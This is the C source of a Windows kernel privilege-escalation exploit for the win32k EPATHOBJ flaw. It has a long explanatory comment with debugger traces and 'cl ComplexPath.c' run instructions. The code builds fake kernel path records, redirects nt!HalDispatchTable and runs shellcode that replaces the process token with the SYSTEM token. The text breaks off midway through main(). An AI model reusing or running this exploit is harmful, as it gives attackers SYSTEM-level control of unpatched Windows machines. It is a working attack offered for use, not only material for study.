#ifndef WIN32_NO_STATUS
# define WIN32_NO_STATUS
#endif
#include <stdio.h>
#include <stdarg.h>
#include <stddef.h>
#include <windows.h>
#include <assert.h>
#ifdef WIN32_NO_STATUS
# undef WIN32_NO_STATUS
#endif
#include <ntstatus.h>

#pragma comment(lib, "gdi32")
#pragma comment(lib, "kernel32")
#pragma comment(lib, "user32")
#pragma comment(lib, "shell32")
#pragma comment(linker, "/SECTION:.text,ERW")

#ifndef PAGE_SIZE
# define PAGE_SIZE 0x1000
#endif

#define MAX_POLYPOINTS (8192 * 3)
#define MAX_REGIONS 8192
#define CYCLE_TIMEOUT 10000

//
// --------------------------------------------------
// Windows NT/2K/XP/2K3/VISTA/2K8/7/8 EPATHOBJ local ring0 exploit
// ----------------------------------------- taviso () cmpxchg8b com -----
//
// INTRODUCTION
//
// There's a pretty obvious bug in win32k!EPATHOBJ::pprFlattenRec where the
// PATHREC object returned by win32k!EPATHOBJ::newpathrec doesn't initialise the
// next list pointer. The bug is really nice, but exploitation when
// allocations start failing is tricky.
//
// ; BOOL __thiscall EPATHOBJ::newpathrec(EPATHOBJ     *this,
//                                        PATHRECORD   **pppr,
//                                        ULONG         *pcMax,
//                                        ULONG cNeeded)
//  .text:BFA122CA                 mov     esi, [ebp+ppr]
//  .text:BFA122CD                 mov     eax, [esi+PATHRECORD.pprPrev]
//  .text:BFA122D0                 push    edi
//  .text:BFA122D1                 mov     edi, [ebp+pprNew]
//  .text:BFA122D4                 mov     [edi+PATHRECORD.pprPrev], eax
//  .text:BFA122D7                 lea     eax, [edi+PATHRECORD.count]
//  .text:BFA122DA                 xor     edx, edx
//  .text:BFA122DC                 mov     [eax], edx
//  .text:BFA122DE                 mov     ecx, [esi+PATHRECORD.flags]
//  .text:BFA122E1                 and     ecx, not (PD_BEZIER)
//  .text:BFA122E4                 mov     [edi+PATHRECORD.flags], ecx 
//  .text:BFA122E7                 mov     [ebp+pprNewCountPtr], eax
//  .text:BFA122EA                 cmp     [edi+PATHRECORD.pprPrev], edx
//  .text:BFA122ED                 jnz     short loc_BFA122F7
//  .text:BFA122EF                 mov     ecx, [ebx+EPATHOBJ.ppath]
//  .text:BFA122F2                 mov     [ecx+PATHOBJ.pprfirst], edi
//
//  It turns out this mostly works because newpathrec() is backed by newpathalloc()
//  which uses PALLOCMEM(). PALLOCMEM() will always zero the buffer returned.
//
//  ; PVOID __stdcall PALLOCMEM(size_t size, int tag)
//  .text:BF9160D7                 xor     esi, esi
//  .text:BF9160DE                 push    esi
//  .text:BF9160DF                 push    esi
//  .text:BF9160E0                 push    [ebp+tag]
//  .text:BF9160E3                 push    [ebp+size]
//  .text:BF9160E6                 call    _HeavyAllocPool () 16 ; HeavyAllocPool(x,x,x,x)
//  .text:BF9160EB                 mov     esi, eax
//  .text:BF9160ED                 test    esi, esi
//  .text:BF9160EF                 jz      short loc_BF9160FF
//  .text:BF9160F1                 push    [ebp+size]      ; size_t
//  .text:BF9160F4                 push    0               ; int
//  .text:BF9160F6                 push    esi             ; void *
//  .text:BF9160F7                 call    _memset
//
//  However, the PATHALLOC allocator includes it's own freelist implementation, and
//  if that codepath can satisfy a request the memory isn't zeroed and returned
//  directly to the caller. This effectively means that we can add our own objects
//  to the PATHRECORD chain.
//
//  We can force this behaviour under memory pressure relatively easily, I just
//  spam HRGN objects until they start failing. This isn't super reliable, but it's
//  good enough for testing.
//
//          // I don't use the simpler CreateRectRgn() because it leaks a GDI handle on
//          // failure. Seriously, do some damn QA Microsoft, wtf.
//          for (Size = 1 << 26; Size; Size >>= 1) {
//              while (CreateRoundRectRgn(0, 0, 1, Size, 1, 1))
//                  ;
//          }
//
//  Adding user controlled blocks to the freelist is a little trickier, but I've
//  found that flattening large lists of bezier curves added with PolyDraw() can
//  accomplish this reliably. The code to do this is something along the lines of:
//
//          for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) {
//              Points[PointNum].x      = 0x41414141 >> 4;
//              Points[PointNum].y      = 0x41414141 >> 4;
//              PointTypes[PointNum]    = PT_BEZIERTO;
//          }
//
//          for (PointNum = MAX_POLYPOINTS; PointNum; PointNum -= 3) {
//              BeginPath(Device);
//              PolyDraw(Device, Points, PointTypes, PointNum);
//              EndPath(Device);
//              FlattenPath(Device);
//              FlattenPath(Device);
//              EndPath(Device);
//          }
//
//   We can verify this is working by putting a breakpoint after newpathrec, and
//   verifying the buffer is filled with recognisable values when it returns:
//
//   kd> u win32k!EPATHOBJ::pprFlattenRec+1E
//   win32k!EPATHOBJ::pprFlattenRec+0x1e:
//   95c922b8 e8acfbffff      call    win32k!EPATHOBJ::newpathrec (95c91e69)
//   95c922bd 83f801          cmp     eax,1
//   95c922c0 7407            je      win32k!EPATHOBJ::pprFlattenRec+0x2f (95c922c9)
//   95c922c2 33c0            xor     eax,eax
//   95c922c4 e944020000      jmp     win32k!EPATHOBJ::pprFlattenRec+0x273 (95c9250d)
//   95c922c9 56              push    esi
//   95c922ca 8b7508          mov     esi,dword ptr [ebp+8]
//   95c922cd 8b4604          mov     eax,dword ptr [esi+4]
//   kd> ba e 1 win32k!EPATHOBJ::pprFlattenRec+23 "dd poi(ebp-4) L1; gc"
//   kd> g
//   fe938fac  41414140
//   fe938fac  41414140
//   fe938fac  41414140
//   fe938fac  41414140
//   fe938fac  41414140
//
//   The breakpoint dumps the first dword of the returned buffer, which matches the
//   bezier points set with PolyDraw(). So convincing pprFlattenRec() to move
//   EPATHOBJ->records->head->next->next into userspace is no problem, and we can
//   easily break the list traversal in bFlattten():
//
//   BOOL __thiscall EPATHOBJ::bFlatten(EPATHOBJ *this)
//   {
//     EPATHOBJ *pathobj; // esi () 1
//     PATHOBJ *ppath; // eax () 1
//     BOOL result; // eax () 2
//     PATHRECORD *ppr; // eax () 3
//
//     pathobj = this;
//     ppath = this->ppath;
//     if ( ppath )
//     {
//       for ( ppr = ppath->pprfirst; ppr; ppr = ppr->pprnext )
//       {
//         if ( ppr->flags & PD_BEZIER )
//         {
//           ppr = EPATHOBJ::pprFlattenRec(pathobj, ppr);
//           if ( !ppr )
//             goto LABEL_2;
//         }
//       }
//       pathobj->fl &= 0xFFFFFFFE;
//       result = 1;
//     }
//     else
//     {
//   LABEL_2:
//       result = 0;
//     }
//     return result;
//   }
//
//   All we have to do is allocate our own PATHRECORD structure, and then spam
//   PolyDraw() with POINTFIX structures containing co-ordinates that are actually
//   pointers shifted right by 4 (for this reason the structure must be aligned so
//   the bits shifted out are all zero).
//
//   We can see this in action by putting a breakpoint in bFlatten when ppr has
//   moved into userspace:
//
//   kd> u win32k!EPATHOBJ::bFlatten
//   win32k!EPATHOBJ::bFlatten:
//   95c92517 8bff            mov     edi,edi
//   95c92519 56              push    esi
//   95c9251a 8bf1            mov     esi,ecx
//   95c9251c 8b4608          mov     eax,dword ptr [esi+8]
//   95c9251f 85c0            test    eax,eax
//   95c92521 7504            jne     win32k!EPATHOBJ::bFlatten+0x10 (95c92527)
//   95c92523 33c0            xor     eax,eax
//   95c92525 5e              pop     esi
//   kd> u
//   win32k!EPATHOBJ::bFlatten+0xf:
//   95c92526 c3              ret
//   95c92527 8b4014          mov     eax,dword ptr [eax+14h]
//   95c9252a eb14            jmp     win32k!EPATHOBJ::bFlatten+0x29 (95c92540)
//   95c9252c f6400810        test    byte ptr [eax+8],10h
//   95c92530 740c            je      win32k!EPATHOBJ::bFlatten+0x27 (95c9253e)
//   95c92532 50              push    eax
//   95c92533 8bce            mov     ecx,esi
//   95c92535 e860fdffff      call    win32k!EPATHOBJ::pprFlattenRec (95c9229a)
//
//   So at 95c9252c eax is ppr->next, and the routine checks for the PD_BEZIERS
//   flags (defined in winddi.h). Let's break if it's in userspace:
//
//   kd> ba e 1 95c9252c "j (eax < poi(nt!MmUserProbeAddress)) 'gc'; ''"
//   kd> g
//   95c9252c f6400810        test    byte ptr [eax+8],10h
//   kd> r
//   eax=41414140 ebx=95c1017e ecx=97330bec edx=00000001 esi=97330bec edi=0701062d
//   eip=95c9252c esp=97330be4 ebp=97330c28 iopl=0         nv up ei pl nz na po nc
//   cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202
//   win32k!EPATHOBJ::bFlatten+0x15:
//   95c9252c f6400810        test    byte ptr [eax+8],10h       ds:0023:41414148=??
//
//   The question is how to turn that into code execution? It's obviously trivial to
//   call prFlattenRec with our userspace PATHRECORD..we can do that by setting
//   PD_BEZIER in our userspace PATHRECORD, but the early exit on allocation failure
//   poses a problem.
//
//   Let me demonstrate calling it with my own PATHRECORD:
//
//       // Create our PATHRECORD in userspace we will get added to the EPATHOBJ
//       // pathrecord chain.
//       PathRecord = VirtualAlloc(NULL,
//                                 sizeof(PATHRECORD),
//                                 MEM_COMMIT | MEM_RESERVE,
//                                 PAGE_EXECUTE_READWRITE);
//
//       // Initialise with recognisable debugging values.
//       FillMemory(PathRecord, sizeof(PATHRECORD), 0xCC);
//
//       PathRecord->next    = (PVOID)(0x41414141);
//       PathRecord->prev    = (PVOID)(0x42424242);
//
//       // You need the PD_BEZIERS flag to enter EPATHOBJ::pprFlattenRec() from
//       // EPATHOBJ::bFlatten(), do that here.
//       PathRecord->flags   = PD_BEZIERS;
//
//       // Generate a large number of Bezier Curves made up of pointers to our
//       // PATHRECORD object.
//       for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) {
//           Points[PointNum].x      = (ULONG)(PathRecord) >> 4;
//           Points[PointNum].y      = (ULONG)(PathRecord) >> 4;
//           PointTypes[PointNum]    = PT_BEZIERTO;
//       }
//
//   kd> ba e 1 win32k!EPATHOBJ::pprFlattenRec+28 "j (dwo(ebp+8) < dwo(nt!MmUserProbeAddress)) ''; 'gc'"
//   kd> g
//   win32k!EPATHOBJ::pprFlattenRec+0x28:
//   95c922c2 33c0            xor     eax,eax
//   kd> dd ebp+8 L1
//   a3633be0  00130000
//
//   The ppr object is in userspace! If we peek at it:
//
//   kd> dd poi(ebp+8)
//   00130000  41414141 42424242 00000010 cccccccc
//   00130010  00000000 00000000 00000000 00000000
//   00130020  00000000 00000000 00000000 00000000
//   00130030  00000000 00000000 00000000 00000000
//   00130040  00000000 00000000 00000000 00000000
//   00130050  00000000 00000000 00000000 00000000
//   00130060  00000000 00000000 00000000 00000000
//   00130070  00000000 00000000 00000000 00000000
//
//   There's the next and prev pointer.
//
//   kd> kvn
//    # ChildEBP RetAddr  Args to Child
//   00 a3633bd8 95c9253a 00130000 002bfea0 95c101ce win32k!EPATHOBJ::pprFlattenRec+0x28 (FPO: [Non-Fpo])
//   01 a3633be4 95c101ce 00000001 00000294 fe763360 win32k!EPATHOBJ::bFlatten+0x23 (FPO: [0,0,4])
//   02 a3633c28 829ab173 0701062d 002bfea8 7721a364 win32k!NtGdiFlattenPath+0x50 (FPO: [Non-Fpo])
//   03 a3633c28 7721a364 0701062d 002bfea8 7721a364 nt!KiFastCallEntry+0x163 (FPO: [0,3] TrapFrame @ a3633c34)
//
//   The question is how to get PATHALLOC() to succeed under memory pressure so we
//   can make this exploitable? I'm quite proud of this list cycle trick,
//   here's how to turn it into an arbitrary write.
//
//   First, we create a watchdog thread that will patch the list atomically
//   when we're ready. This is needed because we can't exploit the bug while
//   HeavyAllocPool is failing, because of the early exit in pprFlattenRec:
//
//   .text:BFA122B8                 call newpathrec              ; EPATHOBJ::newpathrec(_PATHRECORD * *,ulong *,ulong)
//   .text:BFA122BD                 cmp     eax, 1               ; Check for failure
//   .text:BFA122C0                 jz      short continue
//   .text:BFA122C2                 xor     eax, eax             ; Exit early
//   .text:BFA122C4                 jmp     early_exit
//
//   So we create a list node like this:
//
//   PathRecord->Next    = PathRecord;
//   PathRecord->Flags   = 0;
//
//   Then EPATHOBJ::bFlatten() spins forever doing nothing:
//
//   BOOL __thiscall EPATHOBJ::bFlatten(EPATHOBJ *this)
//   {
//       /* ... */
//
//       for ( ppr = ppath->pprfirst; ppr; ppr = ppr->pprnext )
//       {
//         if ( ppr->flags & PD_BEZIER )
//         {
//           ppr = EPATHOBJ::pprFlattenRec(pathobj, ppr);
//         }
//       }
//
//       /* ... */
//   }
//
//   While it's spinning, we clean up in another thread, then patch the thread (we
//   can do this, because it's now in userspace) to trigger the exploit. The first
//   block of pprFlattenRec does something like this:
//
//       if ( pprNew->pprPrev )
//         pprNew->pprPrev->pprnext = pprNew;
//
//   Let's make that write to 0xCCCCCCCC.
//
//   DWORD WINAPI WatchdogThread(LPVOID Parameter)
//   {
//
//       // This routine waits for a mutex object to timeout, then patches the
//       // compromised linked list to point to an exploit. We need to do this.
//       LogMessage(L_INFO, "Watchdog thread %u waiting on Mutex () %p",
//                          GetCurrentThreadId(),
//                          Mutex);
//
//       if (WaitForSingleObject(Mutex, CYCLE_TIMEOUT) == WAIT_TIMEOUT) {
//           // It looks like the main thread is stuck in a call to FlattenPath(),
//           // because the kernel is spinning in EPATHOBJ::bFlatten(). We can clean
//           // up, and then patch the list to trigger our exploit.
//           while (NumRegion--)
//               DeleteObject(Regions[NumRegion]);
//
//           LogMessage(L_ERROR, "InterlockedExchange(%p, %p);", &PathRecord->next, &ExploitRecord);
//
//           InterlockedExchangePointer(&PathRecord->next, &ExploitRecord);
//
//       } else {
//           LogMessage(L_ERROR, "Mutex object did not timeout, list not patched");
//       }
//
//       return 0;
//   }
//
//       PathRecord->next    = PathRecord;
//       PathRecord->prev    = (PVOID)(0x42424242);
//       PathRecord->flags   = 0;
//
//       ExploitRecord.next  = NULL;
//       ExploitRecord.prev  = 0xCCCCCCCC;
//       ExploitRecord.flags = PD_BEZIERS;
//
//   Here's the output on Windows 8:
//
//   kd> g
//   *******************************************************************************
//   *                                                                             *
//   *                        Bugcheck Analysis                                    *
//   *                                                                             *
//   *******************************************************************************
//
//   Use !analyze -v to get detailed debugging information.
//
//   BugCheck 50, {cccccccc, 1, 8f18972e, 2}
//   *** WARNING: Unable to verify checksum for ComplexPath.exe
//   *** ERROR: Module load completed but symbols could not be loaded for ComplexPath.exe
//   Probably caused by : win32k.sys ( win32k!EPATHOBJ::pprFlattenRec+82 )
//
//   Followup: MachineOwner
//   ---------
//
//   nt!RtlpBreakWithStatusInstruction:
//   810f46f4 cc              int     3
//   kd> kv
//   ChildEBP RetAddr  Args to Child
//   a03ab494 8111c87d 00000003 c17b60e1 cccccccc nt!RtlpBreakWithStatusInstruction (FPO: [1,0,0])
//   a03ab4e4 8111c119 00000003 817d5340 a03ab8e4 nt!KiBugCheckDebugBreak+0x1c (FPO: [Non-Fpo])
//   a03ab8b8 810f30ba 00000050 cccccccc 00000001 nt!KeBugCheck2+0x655 (FPO: [6,239,4])
//   a03ab8dc 810f2ff1 00000050 cccccccc 00000001 nt!KiBugCheck2+0xc6
//   a03ab8fc 811a2816 00000050 cccccccc 00000001 nt!KeBugCheckEx+0x19
//   a03ab94c 810896cf 00000001 cccccccc a03aba2c nt! ?? ::FNODOBFM::`string'+0x31868
//   a03aba14 8116c4e4 00000001 cccccccc 00000000 nt!MmAccessFault+0x42d (FPO: [4,37,4])
//   a03aba14 8f18972e 00000001 cccccccc 00000000 nt!KiTrap0E+0xdc (FPO: [0,0] TrapFrame @ a03aba2c)
//   a03abbac 8f103c28 0124eba0 a03abbd8 8f248f79 win32k!EPATHOBJ::pprFlattenRec+0x82 (FPO: [Non-Fpo])
//   a03abbb8 8f248f79 1c010779 0016fd04 8f248f18 win32k!EPATHOBJ::bFlatten+0x1f (FPO: [0,1,0])
//   a03abc08 8116918c 1c010779 0016fd18 776d7174 win32k!NtGdiFlattenPath+0x61 (FPO: [1,15,4])
//   a03abc08 776d7174 1c010779 0016fd18 776d7174 nt!KiFastCallEntry+0x12c (FPO: [0,3] TrapFrame @ a03abc14)
//   0016fcf4 76b1552b 0124147f 1c010779 00000040 ntdll!KiFastSystemCallRet (FPO: [0,0,0])
//   0016fcf8 0124147f 1c010779 00000040 00000000 GDI32!NtGdiFlattenPath+0xa (FPO: [1,0,0])
//   WARNING: Stack unwind information not available. Following frames may be wrong.
//   0016fd18 01241ade 00000001 00202b50 00202ec8 ComplexPath+0x147f
//   0016fd60 76ee1866 7f0de000 0016fdb0 77716911 ComplexPath+0x1ade
//   0016fd6c 77716911 7f0de000 bc1d7832 00000000 KERNEL32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])
//   0016fdb0 777168bd ffffffff 7778560a 00000000 ntdll!__RtlUserThreadStart+0x4a (FPO: [SEH])
//   0016fdc0 00000000 01241b5b 7f0de000 00000000 ntdll!_RtlUserThreadStart+0x1c (FPO: [Non-Fpo])
//   kd> .trap a03aba2c
//   ErrCode = 00000002
//   eax=cccccccc ebx=80206014 ecx=80206008 edx=85ae1224 esi=0124eba0 edi=a03abbd8
//   eip=8f18972e esp=a03abaa0 ebp=a03abbac iopl=0         nv up ei ng nz na pe nc
//   cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010286
//   win32k!EPATHOBJ::pprFlattenRec+0x82:
//   8f18972e 8918            mov     dword ptr [eax],ebx  ds:0023:cccccccc=????????
//   kd> vertarget
//   Windows 8 Kernel Version 9200 MP (1 procs) Free x86 compatible
//   Product: WinNt, suite: TerminalServer SingleUserTS
//   Built by: 9200.16581.x86fre.win8_gdr.130410-1505
//   Machine Name:
//   Kernel base = 0x81010000 PsLoadedModuleList = 0x811fde48
//   Debug session time: Mon May 20 14:17:20.259 2013 (UTC - 7:00)
//   System Uptime: 0 days 0:02:30.432
//   kd> .bugcheck
//   Bugcheck code 00000050
//   Arguments cccccccc 00000001 8f18972e 00000002
//
// EXPLOITATION
//
// We're somewhat limited with what we can do, as we don't control what's
// written, it's always a pointer to a PATHRECORD object. We can clobber a
// function pointer, but the problem is making it point somewhere useful.
//
// The solution is to make the Next pointer a valid sequence of instructions,
// which jumps to our second stage payload. We have to do that in just 4 bytes
// (unless you can find a better call site, let me know if you spot one).
//
// Thanks to progmboy for coming up with the solution: you reach back up the
// stack and pull a SystemCall parameter out of the stack. It turns out
// NtQueryIntervalProfile matches this requirement perfectly.
//
// INSTRUCTIONS
//
// C:\> cl ComplexPath.c
// C:\> ComplexPath
//
// You might need to run it several times before we get the allocation we need,
// it won't crash if it doesn't work, so you can keep trying. I'm not sure how
// to improve that.
//
// CREDIT
//
// Tavis Ormandy <taviso () cmpxchg8b com>
// progmboy <programmeboy () gmail com>
//

POINT       Points[MAX_POLYPOINTS];
BYTE        PointTypes[MAX_POLYPOINTS];
HRGN        Regions[MAX_REGIONS];
ULONG       NumRegion = 0;
HANDLE      Mutex;
DWORD       Finished = 0;

// Log levels.
typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;

BOOL LogMessage(LEVEL Level, PCHAR Format, ...);

// Copied from winddi.h from the DDK
#define PD_BEGINSUBPATH   0x00000001
#define PD_ENDSUBPATH     0x00000002
#define PD_RESETSTYLE     0x00000004
#define PD_CLOSEFIGURE    0x00000008
#define PD_BEZIERS        0x00000010

typedef struct  _POINTFIX
{
    ULONG x;
    ULONG y;
} POINTFIX, *PPOINTFIX;

// Approximated from reverse engineering.
typedef struct _PATHRECORD {
    struct _PATHRECORD *next;
    struct _PATHRECORD *prev;
    ULONG               flags;
    ULONG               count;
    POINTFIX            points[4];
} PATHRECORD, *PPATHRECORD;

PPATHRECORD PathRecord;
PATHRECORD  ExploitRecord;
PPATHRECORD ExploitRecordExit;

enum { SystemModuleInformation = 11 };
enum { ProfileTotalIssues = 2 };

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

FARPROC NtQuerySystemInformation;
FARPROC NtQueryIntervalProfile;
FARPROC PsReferencePrimaryToken;
FARPROC PsLookupProcessByProcessId;
PULONG  HalDispatchTable;
ULONG   HalQuerySystemInformation;
PULONG  TargetPid;
PVOID  *PsInitialSystemProcess;

// Search the specified data structure for a member with CurrentValue.
BOOL FindAndReplaceMember(PDWORD Structure,
                          DWORD CurrentValue,
                          DWORD NewValue,
                          DWORD MaxSize)
{
    DWORD i, Mask;

    // Microsoft QWORD aligns object pointers, then uses the lower three
    // bits for quick reference counting.
    Mask = ~7;

    // Mask out the reference count.
    CurrentValue &= Mask;

    // Scan the structure for any occurrence of CurrentValue.
    for (i = 0; i < MaxSize; i++) {
        if ((Structure[i] & Mask) == CurrentValue) {
            // And finally, replace it with NewValue.
            Structure[i] = NewValue;
            return TRUE;
        }
    }

    // Member not found.
    return FALSE;
}


// This routine is injected into nt!HalDispatchTable by EPATHOBJ::pprFlattenRec.
ULONG __stdcall ShellCode(DWORD Arg1, DWORD Arg2, DWORD Arg3, DWORD Arg4)
{
    PVOID  TargetProcess;

    // Record that the exploit completed.
    Finished = 1;

    // Fix the corrupted HalDispatchTable,
    HalDispatchTable[1] = HalQuerySystemInformation;

    // Find the EPROCESS structure for the process I want to escalate
    if (PsLookupProcessByProcessId(TargetPid, &TargetProcess) == STATUS_SUCCESS) {
        PACCESS_TOKEN SystemToken;
        PACCESS_TOKEN TargetToken;

        // Find the Token object for my target process, and the SYSTEM process.
        TargetToken = (PACCESS_TOKEN) PsReferencePrimaryToken(TargetProcess);
        SystemToken = (PACCESS_TOKEN) PsReferencePrimaryToken(*PsInitialSystemProcess);

        // Find the token in the target process, and replace with the system token.
        FindAndReplaceMember((PDWORD) TargetProcess,
                             (DWORD)  TargetToken,
                             (DWORD)  SystemToken,
                             0x200);
    }

    return 0;
}

DWORD WINAPI WatchdogThread(LPVOID Parameter)
{
    // Here we wait for the main thread to get stuck inside FlattenPath().
    WaitForSingleObject(Mutex, CYCLE_TIMEOUT);

    // It looks like we've taken control of the list, and the main thread
    // is spinning in EPATHOBJ::bFlatten. We can't continue because
    // EPATHOBJ::pprFlattenRec exit's immediately if newpathrec() fails.

    // So first, we clean up and make sure it can allocate memory.
    while (NumRegion) DeleteObject(Regions[--NumRegion]);

    // Now we switch out the Next pointer for our exploit record. As soon
    // as this completes, the main thread will stop spinning and continue
    // into EPATHOBJ::pprFlattenRec.
    InterlockedExchangePointer(&PathRecord->next,
                               &ExploitRecord);
    return 0;
}

// I use this routine to generate a table of acceptable stub addresses. The
// 0x40 offset is the location of the PULONG parameter to
// nt!NtQueryIntervalProfile. Credit to progmboy for coming up with this clever
// trick.
VOID __declspec(naked) HalDispatchRedirect(VOID)
{
    __asm inc eax
    __asm jmp dword ptr [ebp+0x40]; //  0
    __asm inc ecx
    __asm jmp dword ptr [ebp+0x40]; //  1
    __asm inc edx
    __asm jmp dword ptr [ebp+0x40]; //  2
    __asm inc ebx
    __asm jmp dword ptr [ebp+0x40]; //  3
    __asm inc esi
    __asm jmp dword ptr [ebp+0x40]; //  4
    __asm inc edi
    __asm jmp dword ptr [ebp+0x40]; //  5
    __asm dec eax
    __asm jmp dword ptr [ebp+0x40]; //  6
    __asm dec ecx
    __asm jmp dword ptr [ebp+0x40]; //  7
    __asm dec edx
    __asm jmp dword ptr [ebp+0x40]; //  8
    __asm dec ebx
    __asm jmp dword ptr [ebp+0x40]; //  9
    __asm dec esi
    __asm jmp dword ptr [ebp+0x40]; // 10
    __asm dec edi
    __asm jmp dword ptr [ebp+0x40]; // 11

    // Mark end of table.
    __asm {
        _emit 0
        _emit 0
        _emit 0
        _emit 0
    }
}

int main(int argc, char **argv)
{
    HANDLE               Thread;
    HDC                  Device;
    ULONG                Size;
    ULONG                PointNum;
    HMODULE              KernelHandle;
    PULONG               DispatchRedirect;
    PULONG               Interval;
    ULONG                SavedInterval;
    RTL_PROCESS_MODULES  ModuleInfo;

    LogMessage(L_INFO, "\r--------------------------------------------------\n"
                       "\rWindows NT/2K/XP/2K3/VISTA/2K8/7/8 EPATHOBJ local ring0 exploit\n"
                       "\r------------------- taviso () cmpxchg8b com, programmeboy () gmail com ---\n"
                       "\n");

    NtQueryIntervalProfile    = GetProcAddress(GetModuleHandle("ntdll"), "NtQueryIntervalProfile");
    NtQuerySystemInformation  = GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation");
    Mutex                     = CreateMutex(NULL, FALSE, NULL);
    DispatchRedirect          = (PVOID) HalDispatchRedirect;
    Interval                  = (PULONG) ShellCode;
    SavedInterval             = Interval[0];
    TargetPid                 = GetCurrentProcessId();

    LogMessage(L_INFO, "NtQueryIntervalProfile () %p", NtQueryIntervalProfile);
    LogMessage(L_INFO, "NtQuerySystemInformation () %p", NtQuerySystemInformation);

    // Lookup the address of system modules.
    NtQuerySystemInformation(SystemModuleInformation,
                             &ModuleInfo,
                             sizeof ModuleInfo,
                             NULL);

    LogMessage(L_DEBUG, "NtQuerySystemInformation() => %s () %p",
                        ModuleInfo.Modules[0].FullPathName,
                        ModuleInfo.Modules[0].ImageBase);

    // Lookup some system routines we require.
    KernelHandle                = LoadLibrary(ModuleInfo.Modules[0].FullPathName + ModuleInfo.Modules[0].OffsetToFileName);
    HalDispatchTable            = (ULONG) GetProcAddress(KernelHandle, "HalDispatchTable")           - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;
    PsInitialSystemProcess      = (ULONG) GetProcAddress(KernelHandle, "PsInitialSystemProcess")     - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;
    PsReferencePrimaryToken     = (ULONG) GetProcAddress(KernelHandle, "PsReferencePrimaryToken")    - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;
    PsLookupProcessByProcessId  = (ULONG) GetProcAddress(KernelHandle, "PsLookupProcessByProcessId") - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;

    // Search for a ret instruction to install in the damaged HalDispatchTable.
    HalQuerySystemInformation   = (ULONG) memchr(KernelHandle, 0xC3, ModuleInfo.Modules[0].ImageSize)
                                - (ULONG) KernelHandle
                                + (ULONG) ModuleInfo.Modules[0].ImageBase;

    LogMessage(L_INFO, "Discovered a ret instruction at %p", HalQuerySystemInformation);

    // Create our PATHRECORD in user space we will get added to the EPATHOBJ
    // pathrecord chain.
    PathRecord = VirtualAlloc(NULL,
                              sizeof *PathRecord,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);

    LogMessage(L_INFO, "Allocated userspace PATHRECORD () %p", PathRecord);

    // You need the PD_BEZIERS flag to enter EPATHOBJ::pprFlattenRec() from
    // EPATHOBJ::bFlatten(). We don't set it so that we can trigger an infinite
    // loop in EPATHOBJ::bFlatten().
    PathRecord->flags   = 0;
    PathRecord->next    = PathRecord;
    PathRecord->prev    = (PPATHRECORD)(0x42424242);

    LogMessage(L_INFO, "  ->next  @ %p", PathRecord->next);
    LogMessage(L_INFO, "  ->prev  @ %p", PathRecord->prev);
    LogMessage(L_INFO, "  ->flags @ %u", PathRecord->flags);

    // Now we need to create a PATHRECORD at an address that is also a valid
    // x86 instruction, because the pointer will be interpreted as a function.
    // I've created a list of candidates in DispatchRedirect.
    LogMessage(L_INFO, "Searching for an available stub address...");

    // I need to map at least two pages to guarantee the whole structure is
    // available.
    while (!VirtualAlloc(*DispatchRedirect & ~(PAGE_SIZE - 1),
                         PAGE_SIZE * 2,
                         MEM_COMMIT | MEM_RESERVE,
                         PAGE_EXECUTE_READWRITE)) {

        LogMessage(L_WARN, "\tVirtualAlloc(%#x) => %#x",
                            *DispatchRedirect & ~(PAGE_SIZE - 1),
                            GetLastError());

        // This page is not available, try the next candidate.
        if (!*++DispatchRedirect) {
            LogMessage(L_ERROR, "No redirect candidates left, sorry!");
            return 1;
        }
    }

    LogMessage(L_INFO, "Success, ExploitRecordExit () %#0x", *DispatchRedirect);

    // This PATHRECORD must terminate the list and recover.
    ExploitRecordExit           = (PPATHRECORD) *DispatchRedirect;
    ExploitRecordExit->next     = NULL;
    ExploitRecordExit->prev     = NULL;
    ExploitRecordExit->flags    = PD_BEGINSUBPATH;
    ExploitRecordExit->count    = 0;

    LogMessage(L_INFO, "  ->next  @ %p", ExploitRecordExit->next);
    LogMessage(L_INFO, "  ->prev  @ %p", ExploitRecordExit->prev);
    LogMessage(L_INFO, "  ->flags @ %u", ExploitRecordExit->flags);

    // This is the second stage PATHRECORD, which causes a fresh PATHRECORD
    // allocated from newpathrec to nt!HalDispatchTable. The Next pointer will
    // be copied over to the new record. Therefore, we get
    //
    // nt!HalDispatchTable[1] = &ExploitRecordExit.
    //
    // So we make &ExploitRecordExit a valid sequence of instuctions here.
    LogMessage(L_INFO, "ExploitRecord () %#0x", &ExploitRecord);

    ExploitRecord.next          = (PPATHRECORD) *DispatchRedirect;
    ExploitRecord.prev          = (PPATHRECORD) &HalDispatchTable[1];
    ExploitRecord.flags         = PD_BEZIERS | PD_BEGINSUBPATH;
    ExploitRecord.count         = 4;

    LogMessage(L_INFO, "  ->next  @ %p", ExploitRecord.next);
    LogMessage(L_INFO, "  ->prev  @ %p", ExploitRecord.prev);
    LogMessage(L_INFO, "  ->flags @ %u", ExploitRecord.flags);

    LogMessage(L_INFO, "Creating complex bezier path with %x", (ULONG)(PathRecord) >> 4);

    // Generate a large number of Belier Curves made up of pointers to our
    // PATHRECORD object.
    for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) {
        Points[PointNum].x      = (ULONG)(PathRecord) >> 4;
        Points[PointNum].y      = (ULONG)(PathRecord) >> 4;
